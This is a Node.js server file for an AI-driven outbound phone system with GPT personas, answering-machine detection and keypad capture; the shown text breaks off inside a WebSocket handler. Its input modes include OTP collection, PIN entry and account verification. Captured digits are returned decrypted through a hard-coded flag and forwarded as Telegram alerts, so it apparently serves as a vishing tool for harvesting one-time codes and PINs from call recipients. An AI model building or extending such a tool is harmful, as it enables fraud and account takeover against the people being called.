require('colors');

const express = require('express');
const ExpressWs = require('express-ws');
const compression = require('compression');
const cors = require('cors');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const path = require('path');

const { platform, server: serverConfig, twilio: twilioConfig, aws: awsConfig, vonage: vonageConfig, admin: adminConfig, compliance: complianceConfig, deepgram: deepgramConfig } = require('./config');
const { EnhancedGptService, DEFAULT_SYSTEM_PROMPT, DEFAULT_FIRST_MESSAGE } = require('./routes/gpt');
const { getBusinessProfile } = require('./config/business');
const { StreamService } = require('./routes/stream');
const { TranscriptionService } = require('./routes/transcription');
const { TextToSpeechService } = require('./routes/tts');
const { recordingService } = require('./routes/recording');
const { EnhancedSmsService } = require('./routes/sms.js');
const Database = require('./db/db');
const { webhookService } = require('./routes/status');
const DynamicFunctionEngine = require('./functions/DynamicFunctionEngine');
const PersonaComposer = require('./services/PersonaComposer');
const DEFAULT_PERSONAS = require('./functions/personas');
const { AwsConnectAdapter, AwsTtsAdapter, AwsSmsAdapter, VonageVoiceAdapter, VonageSmsAdapter } = require('./adapters');
const { v4: uuidv4 } = require('uuid');
const dtmfUtils = require('./utils/dtmf');

const VoiceResponse = require('twilio').twiml.VoiceResponse;

const app = express();
ExpressWs(app);

app.set('trust proxy', 1);

const corsOptions =
  serverConfig.corsOrigins.length > 0
    ? { origin: serverConfig.corsOrigins, credentials: true }
    : { origin: true, credentials: true };

const apiRateLimiter = rateLimit({
  windowMs: serverConfig.rateLimit.windowMs,
  max: serverConfig.rateLimit.max,
  standardHeaders: true,
  legacyHeaders: false,
});

app.use(helmet({ contentSecurityPolicy: false }));
app.use(compression());
app.use(cors(corsOptions));
app.use(apiRateLimiter);

app.use(express.json({ limit: '1mb' }));
app.use(express.urlencoded({ extended: true }));

const PORT = serverConfig.port;
const publicHost = serverConfig.hostname;
const publicHttpBase = publicHost ? `https://${publicHost}` : `http://localhost:${PORT}`;
const publicWsBase = publicHost ? `wss://${publicHost}` : `ws://localhost:${PORT}`;
const {
  accountSid: twilioAccountSid,
  authToken: twilioAuthToken,
  fromNumber: twilioFromNumber,
} = twilioConfig;
const missingTwilioEnv = [];
if (!twilioAccountSid) missingTwilioEnv.push('TWILIO_ACCOUNT_SID');
if (!twilioAuthToken) missingTwilioEnv.push('TWILIO_AUTH_TOKEN');
if (!twilioFromNumber) missingTwilioEnv.push('FROM_NUMBER');

// Enhanced call configurations with function context
const callConfigurations = new Map();
const activeCalls = new Map();
const callFunctionSystems = new Map(); // Store generated functions per call

let db;
const functionEngine = new DynamicFunctionEngine();
const SUPPORTED_CALL_PROVIDERS = ['twilio', 'aws', 'vonage'];
let currentProvider = SUPPORTED_CALL_PROVIDERS.includes(platform.provider)
  ? platform.provider
  : 'twilio';
platform.provider = currentProvider;
let isAwsProvider = currentProvider === 'aws';
const smsService = new EnhancedSmsService({
  provider: currentProvider
});
const personaComposer = new PersonaComposer();
const awsCallSessions = new Map();
const awsContactIndex = new Map();
const vonageCallIndex = new Map();
const callDtmfBuffers = new Map();
const DTMF_FLUSH_DELAY_MS = 1500;
let awsAdapters = null;
let vonageAdapters = null;

const COLLECT_INPUT_FUNCTIONS = new Set(['ivr_survey', 'pin_entry', 'menu_selection', 'otp_collection', 'account_verification']);
const collectInputCompletion = new Set();

const HUMAN_ANSWER_VALUES = new Set(['human', 'person', 'live', 'positive_human']);
const MACHINE_ANSWER_VALUES = new Set(['machine', 'machine_start', 'fax', 'positive_machine', 'unknown_machine', 'answering_machine']);

function normalizeAnsweredBy(value) {
  if (!value) {
    return '';
  }
  return value.toString().trim().toLowerCase();
}

function isHumanAnsweredBy(value) {
  const normalized = normalizeAnsweredBy(value);
  return HUMAN_ANSWER_VALUES.has(normalized);
}

function isMachineAnsweredBy(value) {
  const normalized = normalizeAnsweredBy(value);
  return MACHINE_ANSWER_VALUES.has(normalized);
}

function sanitizeDigits(rawInput) {
  if (rawInput == null) {
    return '';
  }
  return String(rawInput).replace(/[^0-9*#]/g, '');
}

async function persistDtmfCapture(callSid, digits, options = {}) {
  if (!callSid || !db) {
    return;
  }

  const sanitizedDigits = sanitizeDigits(digits);
  if (!sanitizedDigits) {
    return;
  }

  const {
    source = currentProvider,
    provider = currentProvider,
    stage_key: stageKeyOverride = null,
    stage_label: stageLabelOverride = null,
    metadata: metadataOverride = {},
    finished = undefined,
    reason = undefined,
    capture_method: captureMethod = 'stream',
    skipCallInputInsert = false,
    callInputStep: providedCallInputStep = null,
  } = options;

  try {
    const callRecord = await db.getCall(callSid);
    if (!callRecord) {
      console.warn(`⚠️ DTMF capture skipped; missing call record for ${callSid}`);
      return;
    }

    const callMetadata = parseMetadataJson(callRecord.metadata_json) || {};
    const inputSequence = Array.isArray(callMetadata.input_sequence) ? callMetadata.input_sequence : [];

    let callInputStep = typeof providedCallInputStep === 'number' ? providedCallInputStep : null;
    if (callRecord.call_type === 'collect_input' && !skipCallInputInsert) {
      callInputStep = await db.getNextCallInputStep(callSid);
      await db.saveCallInput({
        call_sid: callSid,
        step: callInputStep,
        input_type: 'digit',
        value: sanitizedDigits,
      });
    }

    const metadataEnvelope =
      metadataOverride && typeof metadataOverride === 'object' && !Array.isArray(metadataOverride)
        ? { ...metadataOverride }
        : {};

    if (callInputStep) {
      metadataEnvelope.call_input_step = callInputStep;
    }

    let stageKey = stageKeyOverride ? dtmfUtils.normalizeStage(stageKeyOverride) : null;
    let stageLabel = stageLabelOverride || null;

    if (!stageKey && metadataEnvelope.stage_key) {
      stageKey = dtmfUtils.normalizeStage(metadataEnvelope.stage_key);
    }

    if (callRecord.call_type === 'collect_input') {
      const stepIndex = callInputStep && inputSequence.length ? callInputStep - 1 : 0;
      const stageConfig =
        (typeof stepIndex === 'number' && inputSequence[stepIndex]) || inputSequence[inputSequence.length - 1];
      if (stageConfig) {
        if (!stageKey && stageConfig.stage) {
          stageKey = dtmfUtils.normalizeStage(stageConfig.stage);
        } else if (!stageKey && stageConfig.label) {
          stageKey = dtmfUtils.normalizeStage(stageConfig.label);
        }
        if (!stageLabel && stageConfig.label) {
          stageLabel = stageConfig.label;
        }
      }
    }

    if (!stageKey) {
      stageKey = 'GENERIC';
    }
    const stageDefinition = dtmfUtils.getStageDefinition(stageKey);
    const resolvedStageLabel = stageLabel || stageDefinition.label;

    const normalizedMetadata = {
      ...metadataEnvelope,
      source,
      provider,
      capture_method: captureMethod,
      stage_label: resolvedStageLabel,
    };

    if (typeof finished === 'boolean') {
      normalizedMetadata.finished = finished;
    }
    if (reason) {
      normalizedMetadata.reason = reason;
    }

    Object.keys(normalizedMetadata).forEach((key) => {
      if (normalizedMetadata[key] === undefined || normalizedMetadata[key] === null) {
        delete normalizedMetadata[key];
      }
    });

    const compliancePayload = dtmfUtils.savePayloadForCompliance(stageKey, sanitizedDigits, provider, normalizedMetadata);

    await db.saveDtmfEntry({
      call_sid: callSid,
      stage_key: compliancePayload.metadata.stage_key,
      masked_digits: compliancePayload.maskedDigits,
      encrypted_digits: compliancePayload.encryptedDigits,
      compliance_mode: complianceConfig?.mode || 'safe',
      provider,
      metadata: compliancePayload.metadata,
    });

    await db.updateCallState(callSid, 'dtmf_captured', {
      stage_key: compliancePayload.metadata.stage_key,
      masked_digits: compliancePayload.maskedDigits,
      digits_preview: sanitizedDigits,
      provider,
      metadata: normalizedMetadata,
    });

    await db.markCallHasInput(callSid, sanitizedDigits);

    const targetChatId = callRecord.telegram_chat_id || callRecord.user_chat_id;
    if (callRecord.call_type !== 'collect_input' && targetChatId) {
      await db.createEnhancedWebhookNotification(callSid, 'call_input_dtmf', targetChatId, 'high');
    }

    await db.logServiceHealth('call_system', 'dtmf_captured', {
      call_sid: callSid,
      digits_length: sanitizedDigits.length,
      stage_key: compliancePayload.metadata.stage_key,
      source,
    });

    const digitsPreview = sanitizedDigits;
    console.log(`🔢 Captured DTMF input for ${callSid}: ${digitsPreview}`.cyan);
  } catch (error) {
    console.error('❌ Failed to persist DTMF input:', error);
  }
}

function extractDigitsFromPayload(candidate) {
  if (candidate == null) {
    return '';
  }
  if (typeof candidate === 'string' || typeof candidate === 'number') {
    return String(candidate);
  }
  if (typeof candidate === 'object') {
    if (typeof candidate.digits === 'string') {
      return candidate.digits;
    }
    if (typeof candidate.Digits === 'string') {
      return candidate.Digits;
    }
    if (typeof candidate.value === 'string') {
      return candidate.value;
    }
  }
  return '';
}

function toBoolean(value) {
  if (typeof value === 'boolean') return value;
  if (typeof value === 'string') {
    const normalized = value.trim().toLowerCase();
    return ['true', '1', 'yes', 'y'].includes(normalized);
  }
  return false;
}

function getDefaultInputSequence(numDigits = 4) {
  return [
    {
      stage: 'ENTRY',
      label: 'Entry',
      prompt: 'Please enter the requested digits followed by the pound key.',
      numDigits: Number(numDigits) || null,
      timeout: 5
    }
  ];
}

function normalizeInputSequencePayload(rawSequence, fallbackDigits = 4) {
  if (!Array.isArray(rawSequence) || rawSequence.length === 0) {
    return getDefaultInputSequence(fallbackDigits);
  }

  return rawSequence.map((step, index) => {
    const normalizedStage = (step?.stage || `STEP_${index + 1}`).toString().toUpperCase();
    return {
      stage: normalizedStage,
      label: step?.label || normalizedStage,
      prompt: step?.prompt || `Please provide input for ${normalizedStage}.`,
      numDigits: step?.numDigits ? Number(step.numDigits) : null,
      timeout: step?.timeout ? Number(step.timeout) : 5,
      thankYou: step?.thankYou || null
    };
  });
}

function parseMetadataJson(value) {
  if (!value) return null;
  if (typeof value === 'object') return value;
  try {
    return JSON.parse(value);
  } catch (error) {
    console.warn('Failed to parse metadata_json:', error.message);
    return null;
  }
}

async function handleCollectInputRequest(req, res, callRecord) {
  const callSid = req.body?.CallSid || req.query?.CallSid;
  if (!callSid) {
    res.status(400).send('Missing CallSid');
    return;
  }

  const callConfig = callConfigurations.get(callSid) || {};
  const metadata = parseMetadataJson(callRecord?.metadata_json) || {};
  const sequenceFromConfig = Array.isArray(callConfig.collect_input_sequence) ? callConfig.collect_input_sequence : null;
  const sequenceFromMetadata = Array.isArray(metadata.input_sequence) ? metadata.input_sequence : null;
  const inputSequence = (sequenceFromConfig && sequenceFromConfig.length)
    ? sequenceFromConfig
    : (sequenceFromMetadata && sequenceFromMetadata.length)
      ? sequenceFromMetadata
      : getDefaultInputSequence(callConfig.collect_digits || 4);

  const thankYouMessage = callConfig.collectThankYouMessage
    || 'Thank you for verifying your information. Your data has been securely recorded. Have a great day.';

  const digits = req.body?.Digits;
  const speechResult = req.body?.SpeechResult;
  const confidence = req.body?.Confidence ? Number(req.body.Confidence) : null;
  const stageParam = parseInt(req.query?.gather_stage || req.body?.GatherStage || '0', 10);

  if (digits || speechResult) {
    const pendingStep = !Number.isNaN(stageParam) && stageParam > 0
      ? stageParam
      : await db.getNextCallInputStep(callSid);
    const normalizedValue = digits ? String(digits) : String(speechResult);
    const inputType = digits ? 'digit' : 'speech';

    await db.saveCallInput({
      call_sid: callSid,
      step: pendingStep,
      input_type: inputType,
      value: normalizedValue,
      confidence: digits ? null : confidence
    });

    await db.markCallHasInput(callSid, normalizedValue);

    if (digits) {
      const stageConfig = inputSequence[pendingStep - 1] || inputSequence[inputSequence.length - 1];
      const stageKey = stageConfig?.stage || `STEP_${pendingStep}`;
      await persistDtmfCapture(callSid, digits, {
        source: 'twilio',
        provider: 'twilio',
        stage_key: stageKey,
        stage_label: stageConfig?.label,
        callInputStep: pendingStep,
        skipCallInputInsert: true,
        capture_method: 'twilio_gather',
        metadata: {
          stage_label: stageConfig?.label,
          gather_stage: pendingStep,
          sequence_length: inputSequence.length,
        },
      });
    }
  }

  const collectedInputs = await db.getCallInputs(callSid);
  if (collectedInputs.length >= inputSequence.length) {
    const response = new VoiceResponse();
    response.say(thankYouMessage);
    response.hangup();
    res.type('text/xml').send(response.toString());
    await finalizeCollectInputCall(callSid, callRecord);
    callConfigurations.delete(callSid);
    return;
  }

  const nextStepIndex = collectedInputs.length;
  const stepConfig = inputSequence[nextStepIndex] || inputSequence[inputSequence.length - 1];
  const response = new VoiceResponse();
  const gatherOptions = {
    input: 'dtmf speech',
    action: `${publicHttpBase}/incoming?CallSid=${encodeURIComponent(callSid)}&gather_stage=${nextStepIndex + 1}`,
    method: 'POST',
    timeout: stepConfig.timeout || 5
  };
  if (stepConfig.numDigits) {
    gatherOptions.numDigits = Number(stepConfig.numDigits);
  }
  const gather = response.gather(gatherOptions);
  gather.say(stepConfig.prompt || 'Please provide your input now.');
  response.say('No input received, let\'s try again.');
  response.redirect(`${publicHttpBase}/incoming?CallSid=${encodeURIComponent(callSid)}`);
  res.type('text/xml').send(response.toString());
}

async function finalizeCollectInputCall(callSid, callDetails) {
  if (!callSid || collectInputCompletion.has(callSid)) {
    return;
  }
  collectInputCompletion.add(callSid);
  try {
    const details = callDetails || await db.getCall(callSid);
    const targetChatId = details?.telegram_chat_id || details?.user_chat_id;
    await db.updateCallStatus(callSid, 'completed', {
      ended_at: new Date().toISOString()
    });

    if (targetChatId) {
      // Summary notifications are handled once the final call outcome is classified.
    }
    if (callConfigurations.has(callSid)) {
      callConfigurations.delete(callSid);
    }
    setTimeout(() => collectInputCompletion.delete(callSid), 60 * 60 * 1000);
  } catch (error) {
    console.error('Failed to finalize collect-input call:', error);
  }
}

async function finalizeCallOutcome(callSid, options = {}) {
  if (!db) {
    return;
  }

  let callRecord = options.call || (await db.getCall(callSid));
  if (!callRecord) {
    return;
  }

  if (callRecord.final_outcome && !options.force) {
    const pendingNotificationChat = callRecord.outcome_notified_at
      ? null
      : callRecord.telegram_chat_id || callRecord.user_chat_id;
    if (pendingNotificationChat) {
      await db.createEnhancedWebhookNotification(callSid, 'call_outcome_summary', pendingNotificationChat, 'high');
    }
    return;
  }

  const finalStatus = (options.finalStatus || callRecord.twilio_status || callRecord.status || '').toLowerCase();
  const answeredCandidate = options.answeredBy || callRecord.answered_by || callRecord.amd_status;
  const normalizedAnswer = normalizeAnsweredBy(answeredCandidate);

  let hasInput = Boolean(callRecord.has_input) || Boolean(callRecord.latest_input_preview);
  let latestInputPreview = callRecord.latest_input_preview;

  if (!hasInput) {
    const latestEntry = await db.getLatestDtmfEntry(callSid);
    if (latestEntry) {
      hasInput = true;
      latestInputPreview =
        dtmfUtils.decryptDigits(latestEntry.encrypted_digits) || latestEntry.masked_digits || latestInputPreview;
    } else {
      const callInputs = await db.getCallInputs(callSid);
      if (callInputs.length > 0) {
        hasInput = true;
      }
    }
  }

  const wasAnswered =
    Boolean(callRecord.was_answered) ||
    options.wasAnswered ||
    ['answered', 'in-progress', 'completed'].includes(finalStatus) ||
    Boolean(normalizedAnswer);

  let outcome;
  if (finalStatus === 'busy') {
    outcome = 'BUSY';
  } else if (finalStatus === 'failed') {
    outcome = 'FAILED';
  } else if (finalStatus === 'canceled') {
    outcome = 'CANCELED';
  } else if (hasInput) {
    outcome = 'ANSWERED_WITH_INPUT';
  } else if (isMachineAnsweredBy(normalizedAnswer)) {
    outcome = 'ANSWERED_NO_INPUT_MACHINE';
  } else if (isHumanAnsweredBy(normalizedAnswer) || wasAnswered) {
    outcome = 'ANSWERED_NO_INPUT_HUMAN';
  } else {
    outcome = 'NO_ANSWER';
  }

  await db.setFinalOutcome(callSid, outcome, {
    answered_by: answeredCandidate || callRecord.answered_by,
    has_input: hasInput ? 1 : 0,
    latest_input_preview: latestInputPreview,
    was_answered: wasAnswered ? 1 : 0,
  });

  callRecord = await db.getCall(callSid);
  const targetChatId = callRecord?.telegram_chat_id || callRecord?.user_chat_id;
  if (targetChatId) {
    await db.createEnhancedWebhookNotification(callSid, 'call_outcome_summary', targetChatId, 'high');
  }
}

function parseDtmfMetadata(metadata) {
  if (!metadata) {
    return {};
  }
  if (typeof metadata === 'object' && !Array.isArray(metadata)) {
    return metadata;
  }
  try {
    return JSON.parse(metadata);
  } catch (error) {
    console.warn('Failed to parse DTMF metadata payload:', error.message);
    return { raw: metadata };
  }
}

function formatDtmfEntriesForResponse(entries = []) {
  const revealRaw = true;

  return entries.map((entry) => {
    const stageKey = dtmfUtils.normalizeStage(entry.stage_key || 'generic');
    const metadata = parseDtmfMetadata(entry.metadata);
    const decrypted = entry.encrypted_digits ? dtmfUtils.decryptDigits(entry.encrypted_digits) : null;
    const rawDigits = revealRaw ? decrypted : null;
    const displayDigits = rawDigits || entry.masked_digits;
    const stageDefinition = dtmfUtils.getStageDefinition(stageKey);

    const formatted = {
      id: entry.id,
      call_sid: entry.call_sid,
      stage_key: stageKey,
      label: stageDefinition.label,
      digits: displayDigits,
      masked_digits: entry.masked_digits,
      received_at: entry.received_at,
      compliance_mode: entry.compliance_mode,
      provider: entry.provider,
      metadata
    };

    if (rawDigits) {
      formatted.raw_digits = rawDigits;
    }

    if (typeof metadata?.length === 'number') {
      formatted.length = metadata.length;
    } else if (entry.masked_digits) {
      formatted.length = String(entry.masked_digits).replace(/[^*•0-9]/g, '').length;
    }

    return formatted;
  });
}

async function ensureAwsAdapters() {
  if (awsAdapters) {
    return awsAdapters;
  }
  try {
    awsAdapters = {
      connect: new AwsConnectAdapter(awsConfig),
      tts: new AwsTtsAdapter(awsConfig),
      sms: new AwsSmsAdapter(awsConfig)
    };
    console.log('✅ AWS adapters initialized (Connect, Polly, Pinpoint)'.green);
    return awsAdapters;
  } catch (error) {
    awsAdapters = null;
    console.error('❌ Failed to initialize AWS adapters:', error.message);
    throw error;
  }
}

async function ensureVonageAdapters() {
  if (vonageAdapters) {
    return vonageAdapters;
  }

  const { apiKey, apiSecret, applicationId, privateKey } = vonageConfig || {};
  if (!apiKey || !apiSecret || !applicationId || !privateKey) {
    throw new Error('Vonage configuration is incomplete. Set VONAGE_API_KEY, VONAGE_API_SECRET, VONAGE_APPLICATION_ID, and VONAGE_PRIVATE_KEY.');
  }

  try {
    vonageAdapters = {
      voice: new VonageVoiceAdapter(vonageConfig),
      sms: new VonageSmsAdapter(vonageConfig),
    };
    console.log('✅ Vonage adapters initialized (Voice, SMS)'.green);
    return vonageAdapters;
  } catch (error) {
    vonageAdapters = null;
    console.error('❌ Failed to initialize Vonage adapters:', error.message);
    throw error;
  }
}

async function applyProvider(provider, options = {}) {
  const normalized = SUPPORTED_CALL_PROVIDERS.includes((provider || '').toLowerCase())
    ? provider.toLowerCase()
    : 'twilio';
  const { persist = true } = options;
  const previousProvider = currentProvider;

  if (normalized === 'twilio' && previousProvider !== 'twilio') {
    if (!twilioAccountSid || !twilioAuthToken || !twilioFromNumber) {
      throw new Error('Twilio credentials are required to activate the Twilio provider');
    }
  }

  if (normalized === 'aws') {
    await ensureAwsAdapters();
    smsService.setProvider('aws', awsAdapters?.sms || null);
    vonageCallIndex.clear();
  } else if (normalized === 'vonage') {
    const adapters = await ensureVonageAdapters();
    if (!vonageConfig?.voice?.fromNumber) {
      console.warn('⚠️ Vonage voice from number not configured. Calls may fail.'.yellow);
    }
    smsService.setProvider('vonage', adapters?.sms || null);
    awsCallSessions.clear();
    awsContactIndex.clear();
  } else {
    if (!twilioAccountSid || !twilioAuthToken || !twilioFromNumber) {
      console.warn('⚠️ Twilio provider active but Twilio credentials appear incomplete. Outbound calls may fail.'.yellow);
    }
    smsService.setProvider('twilio');
    awsCallSessions.clear();
    awsContactIndex.clear();
    if (normalized === 'twilio') {
      vonageCallIndex.clear();
    }
  }

  currentProvider = normalized;
  isAwsProvider = normalized === 'aws';
  platform.provider = currentProvider;

  if (persist && db && typeof db.setSystemSetting === 'function') {
    try {
      await db.setSystemSetting('call_provider', currentProvider);
    } catch (error) {
      console.error('Failed to persist call provider setting:', error);
    }
  }

  if (previousProvider !== currentProvider) {
    console.log(`🔁 Switched active call provider: ${previousProvider?.toUpperCase()} → ${currentProvider.toUpperCase()}`.cyan);
  } else {
    console.log(`ℹ️ Call provider remains ${currentProvider.toUpperCase()}`.gray);
  }

  return { changed: previousProvider !== currentProvider, provider: currentProvider };
}

async function synchronizeProviderFromSettings() {
  if (!db || typeof db.getSystemSetting !== 'function') {
    return;
  }
  try {
    const storedProvider = await db.getSystemSetting('call_provider');
    if (storedProvider) {
      await applyProvider(storedProvider, { persist: false });
    } else {
      await applyProvider(currentProvider, { persist: true });
    }
  } catch (error) {
    console.error('Failed to synchronize call provider from settings:', error);
  }
}

function requireAdminAuth(req, res, next) {
  if (!adminConfig?.apiToken) {
    res.status(503).json({ error: 'Admin API token not configured' });
    return;
  }

  const headerToken = req.headers['x-admin-token'] || req.headers['x-admin-secret'];
  const queryToken = req.query?.admin_token;
  const providedToken = (headerToken || queryToken || '').toString();

  if (providedToken !== adminConfig.apiToken) {
    res.status(401).json({ error: 'Unauthorized' });
    return;
  }

  next();
}

function buildGptService(callSid, callConfig, functionSystem) {
  let gptService;
  const hasAdaptiveConfig = callConfig && functionSystem;
  if (hasAdaptiveConfig) {
    const context = functionSystem.context || {};
    console.log(`🎭 Using adaptive configuration for ${context.industry || 'general'} industry`.green);
    console.log(`🔧 Available functions: ${Object.keys(functionSystem.implementations).join(', ')}`.cyan);

    const promptOverride = callConfig.promptOverride ?? null;
    const firstMessageOverride = callConfig.firstMessageOverride ?? null;
    gptService = new EnhancedGptService(promptOverride, firstMessageOverride);
    gptService.setDynamicFunctions(functionSystem.functions, functionSystem.implementations);
  } else {
    console.log(`🎯 Standard call detected: ${callSid}`.yellow);
    gptService = new EnhancedGptService();
  }

  gptService.setCallSid(callSid);
  if (callConfig?.persona_metadata) {
    gptService.setPersonaMetadata(callConfig.persona_metadata);
  }

  return gptService;
}

async function synthesizeAndQueueAwsSpeech(session, message, interactionCount, options = {}) {
  if (!message || !awsAdapters?.tts || !awsAdapters?.connect) {
    return;
  }

  try {
    const voiceOptions = {};
    if (options.voiceId || session.voiceModel) {
      voiceOptions.voiceId = options.voiceId || session.voiceModel;
    }

    const metadata = {
      call_sid: session.callSid,
      interaction_index: interactionCount,
      personality: options.personalityName || 'default'
    };

    const result = await awsAdapters.tts.synthesizeToS3(message, {
      ...metadata,
      ...voiceOptions
    });

    await awsAdapters.connect.enqueueAudioPlayback({
      contactId: session.contactId,
      audioKey: result.key,
      additionalAttributes: {
        NEXT_PROMPT_BUCKET: result.bucket,
        NEXT_PROMPT_TEXT: message,
        INTERACTION_INDEX: String(interactionCount),
        CALL_SID: session.callSid
      }
    });

    await db.updateCallState(session.callSid, 'ai_audio_enqueued', {
      interaction_count: interactionCount,
      s3_bucket: result.bucket,
      s3_key: result.key
    });
  } catch (error) {
    console.error('Failed to synthesize or enqueue AWS speech:', error);
    await db.logServiceHealth('aws_tts', 'error', {
      call_sid: session.callSid,
      message: error.message
    });
  }
}

async function handleAwsGptReply(session, gptReply, interactionIndex) {
  const personalityInfo = gptReply.personalityInfo || {};
  const message = gptReply.partialResponse;
  if (!message) {
    return;
  }

  try {
    await db.addTranscript({
      call_sid: session.callSid,
      speaker: 'ai',
      message,
      interaction_count: interactionIndex,
      personality_used: personalityInfo.name || 'default',
      adaptation_data: JSON.stringify(gptReply.adaptationHistory || [])
    });

    await db.updateCallState(session.callSid, 'ai_responded', {
      message,
      interaction_count: interactionIndex,
      personality: personalityInfo.name || 'default'
    });
  } catch (dbError) {
    console.error('Database error adding AWS AI transcript:', dbError);
  }

  await synthesizeAndQueueAwsSpeech(session, message, interactionIndex, {
    personalityName: personalityInfo.name || 'default',
    voiceId: session.voiceModel
  });
}

async function initializeAwsCallSession({
  callSid,
  contactId,
  callConfig,
  functionSystem,
  firstMessage,
  voiceModel,
  phoneNumber
}) {
  if (!awsAdapters?.tts || !awsAdapters?.connect) {
    console.warn('AWS adapters unavailable, cannot initialize call session');
    return null;
  }

  const gptService = buildGptService(callSid, callConfig, functionSystem);
  const session = {
    callSid,
    contactId,
    callConfig,
    functionSystem,
    gptService,
    interactionCount: 0,
    startTime: new Date(),
    voiceModel: voiceModel || callConfig.voice_model || null,
    phoneNumber
  };

  gptService.on('gptreply', async (gptReply, icount) => {
    await handleAwsGptReply(session, gptReply, icount);
  });

  gptService.on('personalityChanged', async (changeData) => {
    try {
      await db.updateCallState(callSid, 'personality_changed', {
        from: changeData.from,
        to: changeData.to,
        reason: changeData.reason,
        interaction_count: session.interactionCount
      });
    } catch (dbError) {
      console.error('Database error logging personality change (AWS):', dbError);
    }
  });

  awsCallSessions.set(callSid, session);
  activeCalls.set(callSid, {
    startTime: session.startTime,
    transcripts: [],
    gptService,
    callConfig,
    functionSystem,
    personalityChanges: []
  });

  await db.updateCallState(callSid, 'connect_contact_started', {
    contact_id: contactId,
    phone_number: phoneNumber
  });

  if (firstMessage) {
    try {
      await db.addTranscript({
        call_sid: callSid,
        speaker: 'ai',
        message: firstMessage,
        interaction_count: 0,
        personality_used: 'default'
      });
    } catch (dbError) {
      console.error('Database error adding AWS initial transcript:', dbError);
    }

    await db.updateCallState(callSid, 'ai_intro_ready', {
      message: firstMessage
    });

    await synthesizeAndQueueAwsSpeech(session, firstMessage, 0, {
      personalityName: 'default',
      voiceId: session.voiceModel
    });
  }

  return session;
}

async function startServer() {
  try {
    console.log('🚀 Initializing Adaptive AI Call System...'.blue);

    // Initialize database first
    console.log('Initializing enhanced database...'.yellow);
    db = new Database();
    await db.initialize();
    console.log('✅ Enhanced database initialized successfully'.green);

    if (smsService && typeof smsService.setDatabase === 'function') {
      smsService.setDatabase(db);
    }

    if (currentProvider === 'twilio' && missingTwilioEnv.length > 0) {
      const guidance = [
        'Twilio provider selected but required credentials are missing:',
        ` - Missing: ${missingTwilioEnv.join(', ')}`,
        'Edit api/.env (or set environment variables) with your Twilio Account SID, Auth Token, and FROM_NUMBER.',
        'Example:',
        '  TWILIO_ACCOUNT_SID=ACxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx',
        '  TWILIO_AUTH_TOKEN=your_twilio_auth_token',
        '  FROM_NUMBER=+1234567890',
        'Alternatively, run `npm run setup --prefix api` from the repo root to scaffold the .env file.',
      ].join('\n');
      throw new Error(guidance);
    }

    await synchronizeProviderFromSettings();

    // Start webhook service after database is ready
    console.log('Starting enhanced webhook service...'.yellow);
    webhookService.start(db);
    console.log('✅ Enhanced webhook service started'.green);

    // Initialize function engine
    console.log('✅ Dynamic Function Engine ready'.green);

    // Start HTTP server
    app.listen(PORT, () => {
      console.log(`✅ Enhanced Adaptive API server running on port ${PORT}`.green);
      console.log(`🎭 System ready - Personality Engine & Dynamic Functions active`.green);
      console.log(`📱 Enhanced webhook notifications enabled`.green);
    });

  } catch (error) {
    if (error.migration) {
      console.error(`❌ Failed to start server: database migration failed during "${error.migration}"`);
    }
    console.error('❌ Failed to start server:', error);
    process.exit(1);
  }
}

// Enhanced WebSocket connection handler with dynamic functions
app.ws('/connection', (ws) => {
  if (isAwsProvider) {
    ws.close(1011, 'AWS Connect does not use Twilio media streams');
    return;
  }
  console.log('🔌 New WebSocket connection established'.cyan);
  
  try {
    ws.on('error', (error) => {
      console.error('WebSocket error:', error);
    });

    let streamSid;
    let callSid;
    let callConfig = null;
    let callStartTime = null;
    let functionSystem = null;

    let gptService;
    const streamService = new StreamService(ws);
    const transcriptionService = new TranscriptionService();
    const ttsService = new TextToSpeechService({});
  
    let marks = [];
    let interactionCount = 0;
    let isInitialized = false;

    const recordDtmfInput = async (digits, source = 'twilio', extraMeta = {}) => {
      if (!callSid) {
        return;
      }

      const dtmfDetails = extraMeta?.dtmf || {};
      const stageCandidate =
        extraMeta.stage_key ||
        extraMeta.stage ||
        dtmfDetails.stage_key ||
        dtmfDetails.stage ||
        dtmfDetails.prompt_key ||
        null;

      const metadataEnvelope = {};
      if (dtmfDetails?.timestamp) {
        metadataEnvelope.provider_timestamp = dtmfDetails.timestamp;
      }
      if (typeof dtmfDetails?.confidence === 'number') {
        metadataEnvelope.confidence = dtmfDetails.confidence;
      }
      if (dtmfDetails?.type) {
        metadataEnvelope.provider_type = dtmfDetails.type;
      }
      if (extraMeta?.metadata && typeof extraMeta.metadata === 'object') {
        metadataEnvelope.provider_metadata = extraMeta.metadata;
      }
      if (extraMeta?.captured_at) {
        metadataEnvelope.captured_at = extraMeta.captured_at;
      }

      await persistDtmfCapture(callSid, digits, {
        source,
        provider: currentProvider,
        stage_key: stageCandidate,
        stage_label: extraMeta.stage_label,
        metadata: metadataEnvelope,
        finished: extraMeta.finished === true,
        reason: extraMeta.reason,
        capture_method: 'twilio_stream',
      });
    };

    ws.on('message', async function message(data) {
      try {
        const msg = JSON.parse(data);
        
        if (msg.event === 'start') {
          streamSid = msg.start.streamSid || msg.start.uuid || streamSid;
          callSid = msg.start.callSid || msg.start?.customParameters?.call_sid || callSid;
          const startUuid = msg.start?.uuid || msg.start?.conversationUuid || msg.start?.streamSid;
          if (!callSid && startUuid && vonageCallIndex.has(startUuid)) {
            callSid = vonageCallIndex.get(startUuid);
          }
          if (!callSid && msg.start?.conversationUuid && vonageCallIndex.has(msg.start.conversationUuid)) {
            callSid = vonageCallIndex.get(msg.start.conversationUuid);
          }
          callStartTime = new Date();
          
          console.log(`🎯 Adaptive call started - SID: ${callSid}`.green);
          
          streamService.setStreamSid(streamSid);

          // Update database with enhanced tracking
          try {
            await db.updateCallStatus(callSid, 'started', {
              started_at: callStartTime.toISOString()
            });
            await db.updateCallState(callSid, 'stream_started', {
              stream_sid: streamSid,
              start_time: callStartTime.toISOString()
            });
            
            // Create webhook notification for stream start (internal tracking)
            const call = await db.getCall(callSid);
            if (call && call.user_chat_id) {
              await db.createEnhancedWebhookNotification(callSid, 'call_stream_started', call.user_chat_id);
            }
          } catch (dbError) {
            console.error('Database error on call start:', dbError);
          }

          // Get call configuration and function system
          callConfig = callConfigurations.get(callSid);
          functionSystem = callFunctionSystems.get(callSid);

          if (callConfig?.voice_model) {
            ttsService.setVoiceModel(callConfig.voice_model);
          } else {
            ttsService.resetVoiceModel();
          }

          gptService = buildGptService(callSid, callConfig, functionSystem);

          // Set up GPT reply handler with personality tracking
